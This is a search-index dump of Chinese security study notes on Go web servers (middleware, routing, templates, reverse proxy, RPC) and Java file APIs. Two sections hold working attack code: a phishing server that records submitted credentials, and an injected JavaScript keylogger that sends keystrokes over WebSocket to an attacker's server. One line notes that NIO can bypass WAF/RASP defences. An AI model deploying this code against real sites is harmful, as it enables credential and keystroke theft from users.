\u7684\u522b\u540d,\u5f53\u8c03\u7528ServeHTTP\u51fd\u6570\u7684\u65f6\u5019\u4f1a\u56de\u8c03\u8c03\u7528\u8be5\u51fd\u6570\u672c\u8eab,\u4ece\u800c\u8c03\u7528\u6211\u4eec\u4f8b\u5b50\u4e2d\u7684hello\u51fd\u6570 // The HandlerFunc type is an adapter to allow the use of // ordinary functions as HTTP handlers. If f is a function // with the appropriate signature, HandlerFunc(f) is a // Handler that calls f. type HandlerFunc func ( ResponseWriter , * Request ) // ServeHTTP calls f(w, r). func ( f HandlerFunc ) ServeHTTP ( w ResponseWriter , r * Request ) { f ( w , r ) } \u7136\u540e\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u81ea\u5df1\u7684\u7ed3\u6784\u4f53logger,\u5305\u542b\u4e86\u4e00\u4e2aInner\u5c5e\u6027,\u7c7b\u578b\u4e3ahttp.Handler,\u800chttp.Handler\u7684\u5b9a\u4e49\u5982\u4e0b type Handler interface { ServeHTTP ( ResponseWriter , * Request ) } \u53ef\u4ee5\u770b\u5230\u662f\u4e00\u4e2a\u63a5\u53e3,\u53ea\u9700\u8981\u5b9e\u73b0\u4e86ServeHTTP\u8fd9\u4e2a\u65b9\u6cd5\u5373\u53ef,\u90a3\u4e48\u6211\u4eec\u7684HandlerFunc\u5c31\u80fd\u5145\u5f53Handler \u6700\u540e\u6211\u4eec\u5b9a\u4e49\u4e86logger\u7684ServeHTTP,\u6267\u884c\u67d0\u4e9b\u8bed\u53e5,\u56de\u8c03hello\u8fd9\u4e2a\u51fd\u6570\u7684ServeHTTP,\u6700\u540e\u518d\u6267\u884c\u67d0\u4e9b\u8bed\u53e5,\u5b9e\u73b0\u4e86\u7c7b\u4f3c\u4e8e\u88c5\u9970\u5668\u7684\u7ed3\u6784 \u8c03\u7528\u94fe\u4e3a: ListenAndServe\u4f7f\u7528logger\u4f5c\u4e3a\u8def\u7531->logger.ServeHTTP->hello.ServeHTTP->hello","title":"\u4e00\u4e2a\u7b80\u5355\u7684\u4e2d\u95f4\u4ef6"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u7b2c\u4e09\u65b9\u5305alice","text":"Alice\u63d0\u4f9b\u4e86\u4e00\u79cd\u4fbf\u6377\u7684\u65b9\u5f0f\u6765\u94fe\u63a5\u60a8\u7684HTTP\u4e2d\u95f4\u4ef6\u529f\u80fd\u548c\u5e94\u7528\u7a0b\u5e8f\u5904\u7406\u7a0b\u5e8f\u3002 \u5982\u679c\u4f7f\u7528Alice\u6765\u6539\u5199\u4e0a\u9762\u7684\u4e2d\u95f4\u4ef6\u7684\u8bdd,\u4ee3\u7801\u4f1a\u53d8\u6210 package main import ( \"fmt\" \"log\" \"net/http\" \"time\" \"github.com/justinas/alice\" ) func logHandler ( h http . Handler ) http . Handler { return http . HandlerFunc ( func ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) h . ServeHTTP ( w , r ) log . Print ( \"end\" ) }) } func timeoutHandler ( h http . Handler ) http . Handler { return http . TimeoutHandler ( h , 1 * time . Second , \"timed out\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { fmt . Fprint ( w , \"hello\\n\" ) } func main () { middleWare := alice . New ( logHandler , timeoutHandler ) http . ListenAndServe ( \":8000\" , middleWare . Then ( http . HandlerFunc ( hello ))) } \u53ef\u4ee5\u770b\u5230alice\u5305\u7684\u4f5c\u7528\u5f88\u7b80\u5355,\u5e2e\u52a9\u6211\u4eec\u62fc\u63a5\u4e2d\u95f4\u4ef6,\u5728\u7ecf\u8fc7\u4e2d\u95f4\u4ef6\u8fc7\u540e\u518d\u6267\u884c\u6211\u4eec\u7684Handler","title":"\u7b2c\u4e09\u65b9\u5305:alice"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u7b2c\u4e09\u65b9\u5305mux","text":"\u7ed3\u5408\u4e86alice\u548cmux\u7684\u4e00\u4e2a\u7b80\u5355\u6d4b\u8bd5\u670d\u52a1\u5668\u5982\u4e0b package main import ( \"fmt\" \"log\" \"net/http\" \"time\" \"github.com/gorilla/mux\" \"github.com/justinas/alice\" ) func logHandler ( h http . Handler ) http . Handler { return http . HandlerFunc ( func ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) h . ServeHTTP ( w , r ) log . Print ( \"end\" ) }) } func timeoutHandler ( h http . Handler ) http . Handler { return http . TimeoutHandler ( h , 1 * time . Second , \"timed out\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { value , ok := mux . Vars ( r )[ \"value\" ] w . WriteHeader ( http . StatusOK ) if ok { r . ParseForm () key := r . Form . Get ( \"key\" ) fmt . Fprintf ( w , \"key is %s, value is %s\\n\" , key , value ) } else { fmt . Fprintf ( w , \"hello\" ) } } func main () { middleWare := alice . New ( logHandler , timeoutHandler ) r := mux . NewRouter () s := r . PathPrefix ( \"/hello\" ). Subrouter () s . HandleFunc ( \"\" , hello ). Methods ( \"GET\" ) s . HandleFunc ( \"/\" , hello ). Methods ( \"GET\" ) s . HandleFunc ( \"/{value}\" , hello ). Methods ( \"POST\" ) http . ListenAndServe ( \":8000\" , middleWare . Then ( r )) }","title":"\u7b2c\u4e09\u65b9\u5305:mux"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u7b2c\u4e09\u65b9\u5305martini","text":"Martini\u66f4\u50cf\u662f\u96c6\u6210\u4e86\u524d\u9762\u6240\u6709\u7684\u5305\u7684\u7b2c\u4e09\u65b9\u5305,\u4e0d\u4f7f\u7528\u539f\u751f\u7684net/http\u5305 \u5177\u4f53\u4f7f\u7528\u67e5\u770b \u8fd9\u91cc ,\u503c\u5f97\u4e00\u63d0\u7684\u662f\u53ef\u4ee5\u5728 \u8fd9\u91cc \u627e\u5230\u8fd9\u4e2a\u7b2c\u4e09\u65b9\u5305\u7684\u4e2d\u95f4\u4ef6","title":"\u7b2c\u4e09\u65b9\u5305:Martini"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#html\u6a21\u677f","text":"golang\u4e2d\u81ea\u5e26\u6709html\u6a21\u677f\u7684\u5305: html/template ,\u4e00\u4e2a\u7b80\u5355\u7684\u4f7f\u7528\u5982\u4e0b package main import ( \"html/template\" \"net/http\" \"github.com/go-martini/martini\" ) type TemplateData struct { UserName string Password string } var x = `<html> <body> Hello {{.UserName}}. Your password is {{.Password}}. </body> </html>` func main () { m := martini . Classic () m . Get ( \"/\" , func () string { return \"Hello world!\" }) m . Get ( \"/hello/:UserName/:Password\" , func ( params martini . Params , w http . ResponseWriter ) { t , err := template . New ( \"hello\" ). Parse ( x ) if err != nil { w . WriteHeader ( 500 ) } td := TemplateData { UserName : params [ \"UserName\" ], Password : params [ \"Password\" ]} t . Execute ( w , td ) }) m . RunOnAddr ( \":8000\" ) }","title":"HTML\u6a21\u677f"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#credential-harvesting-attack\u51ed\u8bc1\u6536\u96c6\u653b\u51fb","text":"\u5b9e\u9645\u4e0a\u5c31\u662f\u9493\u9c7c,\u6838\u5fc3\u601d\u60f3\u662f\u521b\u5efa\u514b\u9686\u7f51\u7ad9,\u6b3a\u9a97\u7528\u6237\u8f93\u5165\u5b83\u7684\u51ed\u8bc1\u5e76\u8bb0\u5f55 blackhat-go\u91cc\u7ed9\u4e86\u4e00\u4e2a \u793a\u4f8b \u8fd9\u91cc\u9700\u8981\u5c06\u4e0b\u8f7d\u4e0b\u6765\u7684public/index.html\u4e2d\u7684\u8868\u5355action\u6539\u4e3a\"/login\" \u7136\u540e\u4f7f\u7528golang\u6784\u5efa\u4e00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668\u7528\u4e8e\u7a83\u53d6\u51ed\u8bc1 package main import ( \"net/http\" \"os\" \"time\" \"github.com/gorilla/mux\" log \"github.com/sirupsen/logrus\" ) func login ( w http . ResponseWriter , r * http . Request ) { log . WithFields ( log . Fields { \"time\" : time . Now (). String (), \"username\" : r . FormValue ( \"_user\" ), \"password\" : r . FormValue ( \"_pass\" ), \"user-agent\" : r . UserAgent (), \"ip_address\" : r . RemoteAddr , }). Info ( \"login attempt\" ) http . Redirect ( w , r , \"/\" , 302 ) } func main () { fh , err := os . OpenFile ( \"credentials.txt\" , os . O_CREATE | os . O_APPEND | os . O_WRONLY , 0600 ) if err != nil { panic ( err ) } defer fh . Close () log . SetOutput ( fh ) r := mux . NewRouter () r . HandleFunc ( \"/login\" , login ). Methods ( \"POST\" ) r . PathPrefix ( \"/\" ). Handler ( http . FileServer ( http . Dir ( \"./public\" ))) log . Fatal ( http . ListenAndServe ( \":8080\" , r )) } \u8fd9\u91cc\u7528\u5230\u4e86http.FileServer\u548chttp.Dir,\u914d\u5408gorilla/mux,\u5c06public\u76ee\u5f55\u8bbe\u7f6e\u6210\u4e86web\u6839\u76ee\u5f55,\u51fd\u6570login\u7684\u4f5c\u7528\u5c31\u662f\u5c06\u7528\u6237post\u7684\u5185\u5bb9\u8bb0\u5f55\u5728\u65e5\u5fd7\u4e2d","title":"Credential Harvesting Attack(\u51ed\u8bc1\u6536\u96c6\u653b\u51fb)"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#keylogging-with-websocket\u4f7f\u7528websocket\u7684\u952e\u76d8\u8bb0\u5f55\u5668","text":"\u653b\u51fb\u573a\u666f\u662f\u81ea\u5df1\u67b6\u8bbe\u4e86\u4e00\u4e2a\u670d\u52a1\u5668\u6216\u8005\u67d0\u4e2a\u670d\u52a1\u5668\u4e0a\u5b58\u5728XSS\u6f0f\u6d1e,\u8fd9\u65f6\u53ef\u4ee5\u901a\u8fc7\u63d2\u5165\u67d0\u6bb5\u6076\u610fJS\u4ee3\u7801,\u901a\u8fc7Websocket\u5c06\u7528\u6237\u7684\u4efb\u4f55\u8f93\u5165\u53d1\u9001\u56de\u653b\u51fb\u8005\u7684\u670d\u52a1\u5668 \u9996\u5148\u9700\u8981\u4e00\u4e2a\u6d4b\u8bd5\u73af\u5883,blackhat-go\u63a8\u8350\u4f7f\u7528 JSBIN \u4e00\u6bb5\u6d4b\u8bd5\u7528\u7684HTML\u4ee3\u7801 <!DOCTYPE html> < html > < head > < title > Login </ title > </ head > < body > < script src = 'http://localhost:8080/logger.js' ></ script > < form action = '/login' method = 'post' > < input name = 'username' /> < input name = 'password' /> < input type = \"submit\" /> </ form > </ body > </ html > \u4e00\u6bb5\u7b80\u5355\u7684\u5efa\u7acbwebsocket\u7684logger.js (Go\u6a21\u677f) ( function () { var conn = new WebSocket ( \"ws://{{.}}/ws\" ); document . onkeypress = keypress ; function keypress ( evt ) { s = String . fromCharCode ( evt . which ); conn . send ( s ); } })(); \u7136\u540e\u4e00\u4e2a\u7528\u4e8e\u63d0\u4f9blogger.js\u548c\u5904\u7406websocket\u7684\u670d\u52a1\u5668,\u8fd9\u91cc\u7528\u5230\u4e86 websocket \u7b2c\u4e09\u65b9\u5305 package main import ( \"flag\" \"fmt\" \"html/template\" \"log\" \"net/http\" \"github.com/gorilla/mux\" \"github.com/gorilla/websocket\" ) var ( upgrader = websocket . Upgrader { CheckOrigin : func ( r * http . Request ) bool { return true }, } listenAddr string wsAddr string jsTemplate * template . Template ) func init () { flag . StringVar ( & listenAddr , \"listen\" , \"\" , \"Address to listen on\" ) flag . StringVar ( & wsAddr , \"ws\" , \"\" , \"Address for WebSocket connection\" ) flag . Parse () var err error jsTemplate , err = template . ParseFiles ( \"logger.js\" ) if err != nil { panic ( err ) } } func serveWS ( w http . ResponseWriter , r * http . Request ) { conn , err := upgrader . Upgrade ( w , r , nil ) if err != nil { http . Error ( w , \"\" , 500 ) return } defer conn . Close () fmt . Printf ( \"Connection from %s\\n\" , conn . RemoteAddr (). String ()) for { _ , msg , err := conn . ReadMessage () if err != nil { return } fmt . Printf ( \"From %s: %s\\n\" , conn . RemoteAddr (). String (), string ( msg )) } } func serveLogger ( w http . ResponseWriter , r * http . Request ) { w . Header (). Set ( \"Content-Type\" , \"application/javascript\" ) jsTemplate . Execute ( w , wsAddr ) } func main () { r := mux . NewRouter () r . HandleFunc ( \"/ws\" , serveWS ) r . HandleFunc ( \"/logger.js\" , serveLogger ) fmt . Println ( \"test\" , wsAddr ) log . Fatal ( http . ListenAndServe ( \":8080\" , r )) } websocket\u8fd8\u662f\u5f88\u597d\u73a9\u7684,\u5b9e\u9645\u6548\u679c\u5982\u4e0b \u8f6c\u79fb\u7b14\u8bb0\u7684\u65f6\u5019\u56fe\u5f04\u4e22\u4e86\uff0c\u5404\u4f4d\u5e08\u5085\u4eec\u8bf7\u81ea\u5df1\u624b\u52a8\u6d4b\u8bd5\u4e0b\u4ee3\u7801\u5427","title":"Keylogging With Websocket(\u4f7f\u7528Websocket\u7684\u952e\u76d8\u8bb0\u5f55\u5668)"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#reverse-proxy\u53cd\u5411\u4ee3\u7406","text":"golang\u81ea\u5e26\u7684httputil\u5305\u4e2d\u5b58\u5728ReverseProxy\u7684\u5b9e\u73b0,\u4e00\u4e2a\u7b80\u5355\u7684\u53cd\u5411\u4ee3\u7406\u5982\u4e0b package main import ( \"log\" \"net/http\" \"net/http/httputil\" \"net/url\" ) func main () { // \u5c06 http://127.0.0.1:8888/ \u53cd\u5411\u4ee3\u7406\u5230 http://127.0.0.1:80/ targetUrlString := \"http://127.0.0.1:80/\" targetUrl , err := url . Parse ( targetUrlString ) if err != nil { log . Fatal ( \"err\" ) } proxy := httputil . NewSingleHostReverseProxy ( targetUrl ) log . Println ( \"Reverse proxy server at 127.0.0.1:8888\" ) if err := http . ListenAndServe ( \":8888\" , proxy ); err != nil { log . Fatalln ( \"Error:\" , err ) } }","title":"Reverse Proxy(\u53cd\u5411\u4ee3\u7406)"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u7b80\u5355\u7684rpc\u670d\u52a1\u5668","text":"\u53c2\u8003\u6587\u7ae0: Go\u5b98\u65b9\u5e93RPC\u5f00\u53d1\u6307\u5357 \u4f7f\u7528golang\u4e2d\u81ea\u5e26\u7684 net/rpc \u5305\u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684rpc\u670d\u52a1\u5668(\u53ef\u4ee5\u7528\u4e8e\u5b9e\u73b0\u7c7b\u4f3c\u52a8\u6001\u5bfc\u5165\u7684\u529f\u80fd) \u9996\u5148\u5b9a\u4e49\u4e00\u4e2a rpc_client.go package rpc_server import ( \"errors\" \"log\" \"net\" \"net/http\" \"net/rpc\" ) type Args struct { // \u4f20\u5165\u53c2\u6570\u7ed3\u6784 A , B int } // \u8fd4\u56de\u53c2\u6570\u7ed3\u6784 type Quotient struct { Quo , Rem int } // rpc\u670d\u52a1\u5668\u8981\u5b9e\u73b0\u7684\u63a5\u53e3 type ServiceInterface interface { Multiply ( args * Args , reply * int ) error Divide ( args * Args , quo * Quotient ) error } // \u7a7a\u7684\u7ed3\u6784,\u7528\u4e8e\u5b9e\u73b0rpc\u670d\u52a1\u5668\u63a5\u53e3 type Service struct { } // \u5b9e\u73b0Multiply\u65b9\u6cd5 func ( ss * Service ) Multiply ( args * Args , reply * int ) error { * reply = args . A * args . B return nil } // \u5b9e\u73b0Divide\u65b9\u6cd5 func ( ss * Service ) Divide ( args * Args , quo * Quotient ) error { if args . B == 0 { return errors . New ( \"Divide by zero\" ) } quo . Quo = args . A / args . B quo . Rem = args . A % args . B return nil } // \u5f00\u59cb\u76d1\u542c\u7aef\u53e3,\u5904\u7406\u8fde\u63a5 func Start () { s := new ( Service ) rpc . Register ( s ) rpc . HandleHTTP () l , e := net . Listen ( \"tcp\" , \":8888\" ) if e != nil { log . Fatal ( \"listen error:\" , e ) } go http . Serve ( l , nil ) } \u7136\u540e\u7f16\u5199 rpc_client.go package rpc_client import ( \"fmt\" \"learn/rpc_server\" \"log\" \"net/rpc\" ) const ServiceName = \"Service\" // \u8fde\u63a5\u5230rpc\u670d\u52a1\u5668\u5e76\u4e14\u8fdc\u7a0b\u8c03\u7528Multiply\u65b9\u6cd5 func Connect ( address string ) { client , err := rpc . DialHTTP ( \"tcp\" , address ) if err != nil { log . Fatal ( \"Dial error:\" , err ) } args := & rpc_server . Args { A : 7 , B : 8 } var reply int err = client . Call ( ServiceName + \".Multiply\" , args , & reply ) if err != nil { log . Fatal ( \"Error:\" , err ) } fmt . Printf ( \"Multiply: %d*%d=%d\" , args . A , args . B , reply ) } \u6700\u540e\u7f16\u5199\u4e00\u4e2amain.go\u505a\u6d4b\u8bd5 package main import ( \"learn/rpc_client\" \"learn/rpc_server\" \"time\" ) func main () { rpc_server . Start () time . Sleep ( 1 * time . Second ) rpc_client . Connect ( \"127.0.0.1:8888\" ) } \u5b9e\u73b0\u6548\u679c\u5982\u4e0b \u8f6c\u79fb\u7b14\u8bb0\u7684\u65f6\u5019\u56fe\u5f04\u4e22\u4e86\uff0c\u5404\u4f4d\u5e08\u5085\u4eec\u8bf7\u81ea\u5df1\u624b\u52a8\u6d4b\u8bd5\u4e0b\u4ee3\u7801\u5427 \u7136\u800cgolang\u4e2d\u81ea\u5e26\u7684net/rpc\u5305\u5b58\u5728\u67d0\u4e9b\u7f3a\u70b9,\u5982: (\u53c2\u8003\u6587\u7ae0: Golang\u6807\u51c6\u5e93RPC\u5b9e\u8df5\u53ca\u6539\u8fdb ) \u5f53\u96c6\u7fa4\u673a\u5668\u589e\u52a0\u5230\u4e00\u5b9a\u6570\u91cf,\u8bf7\u6c42\u91cf\u53d8\u5927\u65f6,\u4f1a\u51fa\u73b0\u5f88\u591a\u4efb\u52a1\u5361\u4f4f\u6ca1\u6709\u54cd\u5e94\u7684\u60c5\u51b5,\u53ef\u4ee5\u8f6c\u7528tcp\u5b9e\u73b0rpc\u670d\u52a1\u5668\u89e3\u51b3 rpc\u5305\u91cc\u7684rpc.Dial\u51fd\u6570\u6ca1\u6709timeout, \u7cfb\u7edf\u9ed8\u8ba4\u662f\u6ca1\u6709timeout\u7684,\u6240\u4ee5\u5728\u8fd9\u91cc\u53ef\u80fd\u5361\u4f4f.\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u91c7\u7528net\u5305\u91cc\u7684 net.DialTimeout\u51fd\u6570 rpc\u5305\u91cc\u9ed8\u8ba4\u4f7f\u7528gobCodec\u6765\u7f16\u7801\u89e3\u7801, \u8fd9\u91ccio\u53ef\u80fd\u4f1a\u5361\u4f4f\u800c\u4e0d\u8fd4\u56de\u9519\u8bef,\u6240\u4ee5\u6211\u4eec\u8981\u81ea\u5df1\u7f16\u5199\u52a0\u5165timeout\u7684codec. \u6ce8\u610fserver\u8fd9\u8fb9\u8bfb\u5199\u90fd\u6709timeout,\u4f46\u662fclient\u8fd9\u8fb9\u53ea\u6709\u5199\u6709timeout,\u56e0\u4e3a\u8bfb\u7684\u8bdd\u5e76\u4e0d\u80fd\u9884\u77e5\u4efb\u52a1\u5b8c\u6210\u7684\u65f6\u95f4 \u53ef\u4ee5\u5b66\u4e60\u4e0b rpcx \u597d\u50cf\u4f7f\u7528\u8d77\u6765\u66f4\u52a0\u7b80\u5355,\u800c\u4e14features\u4e5f\u5f88\u591a \u4e00\u4e2a\u7b80\u5355\u7684\u670d\u52a1\u5668\u5982\u4e0b package main import ( \"context\" \"flag\" \"fmt\" example \"github.com/rpcxio/rpcx-examples\" \"github.com/smallnest/rpcx/server\" ) var ( addr = flag . String ( \"addr\" , \"localhost:8888\" , \"server address\" ) ) type Arith struct {} // the second parameter is not a pointer func ( t * Arith ) Mul ( ctx context . Context , args example . Args , reply * example . Reply ) error { reply . C = args . A * args . B fmt . Println ( \"C=\" , reply . C ) return nil } func main () { flag . Parse () s := server . NewServer () //s.Register(new(Arith), \"\") s . RegisterName ( \"Arith\" , new ( Arith ), \"\" ) err := s . Serve ( \"tcp\" , * addr ) if err != nil { panic ( err ) } } \u4e00\u4e2a\u7b80\u5355\u7684\u5ba2\u6237\u7aef\u5982\u4e0b,\u8fd9\u91cc\u503c\u5f97\u6ce8\u610f\u7684\u662f\u6839\u636egithub\u7684Readme\u6240\u8bf4,\u56e0\u4e3arpcx\u4f9d\u8d56\u4e8eetcd,\u800cetcd\u5728go mods\u91cc\u4f7f\u7528\u5b58\u5728\u95ee\u9898,\u6240\u4ee5\u9700\u8981\u5728go.mod\u4e2d\u6dfb\u52a0 replace google.golang.org/grpc => google.golang.org/grpc v1.29.0 package main import ( \"context\" \"flag\" \"log\" \"github.com/smallnest/rpcx/protocol\" example \"github.com/rpcxio/rpcx-examples\" \"github.com/smallnest/rpcx/client\" ) var ( addr = flag . String ( \"addr\" , \"localhost:8888\" , \"server address\" ) ) func main () { flag . Parse () d := client . NewPeer2PeerDiscovery ( \"tcp@\" +* addr , \"\" ) opt := client . DefaultOption opt . SerializeType = protocol . JSON xclient := client . NewXClient ( \"Arith\" , client . Failtry , client . RandomSelect , d , opt ) defer xclient . Close () args := example . Args { A : 10 , B : 20 , } reply := & example . Reply {} err := xclient . Call ( context . Background (), \"Mul\" , args , reply ) if err != nil { log . Fatalf ( \"failed to call: %v\" , err ) } log . Printf ( \"%d * %d = %d\" , args . A , args . B , reply . C ) } \u53ef\u4ee5\u770b\u5230\u63a5\u6536\u53c2\u6570\u548c\u8fd4\u56de\u53c2\u6570\u7684\u5b9a\u4e49\u90fd\u5b58\u5728\u4e86 github.com/rpcxio/rpcx-examples \u91cc,\u5230\u65f6\u5019\u8981\u81ea\u5df1\u7f16\u5199\u7684\u8bdd\u53ef\u4ee5\u81ea\u5df1\u63d0\u524d\u5199\u597d\u4e22\u5230github\u4e0a \u53ef\u4ee5\u5b66\u4e60\u4e0b grpc-go (\u4f3c\u4e4e\u6982\u5ff5\u6bd4\u8f83\u591a \u6682\u65f6\u5495\u4e86)","title":"\u7b80\u5355\u7684RPC\u670d\u52a1\u5668"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JAVA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/","text":"JAVA\u6587\u4ef6\u7cfb\u7edf # JAVA SE\u5185\u7f6e\u4e86\u4e24\u7c7b\u6587\u4ef6\u7cfb\u7edf:\uff1a java.io \u548c java.nio \uff0c java.nio \u7684\u5b9e\u73b0\u662f sun.nio JAVA IO \u6587\u4ef6\u7cfb\u7edf # Java\u62bd\u8c61\u51fa\u4e86\u4e00\u4e2a\u6587\u4ef6\u7cfb\u7edf\u7684\u5bf9\u8c61: java.io.FileSystem \uff0c\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u6709\u4e0d\u4e00\u6837\u7684\u6587\u4ef6\u7cfb\u7edf,\u4f8b\u5982 Windows \u548c Unix \u5c31\u662f\u4e24\u79cd\u4e0d\u4e00\u6837\u7684\u6587\u4ef6\u7cfb\u7edf\uff1a java.io.UnixFileSystem \u3001 java.io.WinNTFileSystem java.io.FileSystem \u662f\u4e00\u4e2a\u62bd\u8c61\u7c7b\uff0c\u5b83\u62bd\u8c61\u4e86\u5bf9\u6587\u4ef6\u7684\u64cd\u4f5c\uff0c\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\u7684JDK\u4f1a\u5b9e\u73b0\u5176\u62bd\u8c61\u7684\u65b9\u6cd5\u4ece\u800c\u4e5f\u5c31\u5b9e\u73b0\u4e86\u8de8\u5e73\u53f0\u7684\u6587\u4ef6\u7684\u8bbf\u95ee\u64cd\u4f5c\u3002 \u9700\u8981\u6ce8\u610f\u7684\u70b9\u6709\uff1a 1. \u5e76\u4e0d\u662f\u6240\u6709\u7684\u6587\u4ef6\u64cd\u4f5c\u90fd\u5728 java.io.FileSystem \u4e2d\u5b9a\u4e49,\u6587\u4ef6\u7684\u8bfb\u53d6\u6700\u7ec8\u8c03\u7528\u7684\u662f java.io.FileInputStream#read0\u3001readBytes \u3001 java.io.RandomAccessFile#read0\u3001readBytes ,\u800c\u5199\u6587\u4ef6\u8c03\u7528\u7684\u662f java.io.FileOutputStream#writeBytes \u3001 java.io.RandomAccessFile#write0 \u3002 2. Java\u6709\u4e24\u7c7b\u6587\u4ef6\u7cfb\u7edfAPI\uff01\u4e00\u4e2a\u662f\u57fa\u4e8e \u963b\u585e\u6a21\u5f0f\u7684IO \u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u53e6\u4e00\u662fJDK7+\u57fa\u4e8e NIO.2 \u7684\u6587\u4ef6\u7cfb\u7edf\u3002 FileInputStream # ```java package top.longlone; import java.io.ByteArrayOutputStream; import java.io.File; import java.io.FileInputStream; public class FileStudy { public static void main(String[] args) throws Exception { File file = new File(\"C:\\Users\\11624\\Desktop\\test.txt\"); FileInputStream fileInputStream = new FileInputStream(file); int a = 0; byte[] bytes = new byte[1024]; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); while ((a = fileInputStream.read(bytes)) != -1) { byteArrayOutputStream.write(bytes, 0, a); } System.out.println(byteArrayOutputStream.toString()); } } \u4f7f\u7528\u4f8b\u5b50\u5982\u4e0a\u3002 ### FileOutputStream ```java package top.longlone; import java.io.File; import java.io.FileOutputStream; import java.nio.charset.StandardCharsets; public class FileStudy { public static void main(String[] args) throws Exception { File file = new File(\"C:\\\\Users\\\\11624\\\\Desktop\\\\test2.txt\"); String content = \"Hello world.\"; FileOutputStream fileOutputStream = new FileOutputStream(file); fileOutputStream.write(content.getBytes(StandardCharsets.UTF_8)); fileOutputStream.flush(); fileOutputStream.close(); } } \u4f7f\u7528\u4f8b\u5b50\u5982\u4e0a\u3002 JAVA NIO.2 \u6587\u4ef6\u7cfb\u7edf # Java 7\u63d0\u51fa\u4e86\u4e00\u4e2a\u57fa\u4e8eNIO\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u8fd9\u4e2aNIO\u6587\u4ef6\u7cfb\u7edf\u548c\u963b\u585eIO\u6587\u4ef6\u7cfb\u7edf\u4e24\u8005\u662f\u5b8c\u5168\u72ec\u7acb\u7684\u3002 java.nio.file.spi.FileSystemProvider \u5bf9\u6587\u4ef6\u7684\u5c01\u88c5\u548c java.io.FileSystem \u540c\u7406\u3002 NIO\u7684\u6587\u4ef6\u64cd\u4f5c\u5728\u4e0d\u540c\u7684\u7cfb\u7edf\u7684\u6700\u7ec8\u5b9e\u73b0\u7c7b\u4e5f\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u6bd4\u5982Mac\u7684\u5b9e\u73b0\u7c7b\u662f: sun.nio.fs.UnixNativeDispatcher ,\u800cWindows\u7684\u5b9e\u73b0\u7c7b\u662f sun.nio.fs.WindowsNativeDispatcher \u3002 \u5408\u7406\u7684\u5229\u7528NIO\u6587\u4ef6\u7cfb\u7edf\u8fd9\u4e00\u7279\u6027\u6211\u4eec\u53ef\u4ee5\u7ed5\u8fc7\u67d0\u4e9b\u53ea\u662f\u9632\u5fa1\u4e86 java.io.FileSystem \u7684 WAF / RASP","title":"java\u6587\u4ef6\u7cfb\u7edf"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JAVA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#java\u6587\u4ef6\u7cfb\u7edf","text":"JAVA SE\u5185\u7f6e\u4e86\u4e24\u7c7b\u6587\u4ef6\u7cfb\u7edf:\uff1a java.io \u548c java.nio \uff0c java.nio \u7684\u5b9e\u73b0\u662f sun.nio","title":"JAVA\u6587\u4ef6\u7cfb\u7edf"},{"location":"%E5%AE%89%E5%85%A8/java/JavaWeb%E5%AE%89%E5%85%A8-%E6%96%87%E7%AB%A0%E5%A4%8D%E7%8E%B0/JAVA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/#java-io-\u6587\u4ef6\u7cfb\u7edf","text":"Java\u62bd\u8c61\u51fa\u4e86\u4e00\u4e2a\u6587\u4ef6\u7cfb\u7edf\u7684\u5bf9\u8c61: java.io.FileSystem \uff0c\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u6709\u4e0d\u4e00\u6837\u7684\u6587\u4ef6\u7cfb\u7edf,\u4f8b\u5982 Windows \u548c Unix \u5c31\u662f\u4e24\u79cd\u4e0d\u4e00\u6837\u7684\u6587\u4ef6\u7cfb\u7edf\uff1a java.io.UnixFileSystem \u3001 java.io.WinNTFileSystem java.io.FileSystem 